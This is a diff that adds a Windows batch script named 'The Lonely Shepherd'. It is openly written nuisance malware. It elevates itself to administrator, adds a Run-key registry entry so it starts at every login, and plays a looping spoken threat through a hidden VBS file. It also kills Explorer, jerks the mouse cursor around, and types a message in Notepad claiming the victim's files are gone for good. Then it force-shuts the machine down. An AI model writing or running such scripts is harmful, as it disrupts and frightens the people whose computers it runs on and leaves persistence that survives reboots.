@@ -1,0 +1,55 @@
+@echo off
+:: [PHASE 0: STEALTH & ADMIN]
+chcp 65001 >nul
+if not "%1"=="am_admin" (powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" & exit /b)
+powershell -WindowStyle Hidden -Command ""
+
+:: [PHASE 1: THE PERSISTENCE]
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HormuzShepherd" /t REG_SZ /d "%~f0" /f >nul 2>&1
+
+:: [PHASE 2: THE VOICES OF ANTIQUITY]
+set "id=%random%"
+set "f_vbs=%temp%\%id%_final.vbs"
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo S.Speak "Marg dar tangeh. The Lonely Shepherd is here to take your soul."
+echo Do
+echo    S.Rate = -10: S.Speak "𓅓𓅱𓏏. Memento Mori. ⭐"
+echo    WScript.Sleep 10000
+echo Loop
+) > "%f_vbs%"
+start /b wscript "%f_vbs%"
+
+:: [PHASE 3: THE 100x ARCHITECTURAL CHAOS]
+powershell -Command "Stop-Process -Name explorer -Force" >nul 2>&1
+for /l %%x in (1,1,100) do (
+   powershell -Command "[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080))" >nul 2>&1
+   if %%x==50 start cmd /c "msg * ستاره تو خاموش شد - نجمك انطفأ ⭐"
+)
+
+:: [PHASE 4: THE LONELY SHEPHERD SYMPHONY]
+:: محاكاة نغمات معزوفة "الراعي الوحيد" باستخدام ترددات الـ Beep (اللمسة الحزينة)
+echo [SYSTEM]: Playing The Lonely Shepherd...
+powershell -Command "[console]::beep(783, 500); [console]::beep(880, 500); [console]::beep(932, 1000); [console]::beep(880, 500); [console]::beep(783, 500); [console]::beep(698, 1000)"
+
+:: [PHASE 5: THE PHANTOM TYPIST]
+start notepad.exe
+timeout /t 2 >nul
+powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'استمع إلى ناي الراعي الوحيد... 𓅓𓅱𓏏 ... إنه يعزف لرحيل ملفاتك إلى الأبد. نراك في مضيق هرمز.'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Sleep -m 80}"
+
+:: [PHASE 6: THE FINAL RED SCREEN]
+color 4f
+cls
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  [HORMUZ_v100_FINAL]: THE LONELY SHEPHERD       !
+echo !  [STATUS]: ALL LANGUAGES SYNCED (100 FEATURES)  !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+:: [PHASE 7: SYSTEM TERMINATION]
+:: تكرار النغمة الحزينة الأخيرة قبل الانهيار
+powershell -Command "[console]::beep(523, 1500)"
+timeout /t 5 >nul
+powershell -Command "wininit" >nul 2>&1
+shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. الراعي الوحيد أغلق الباب."
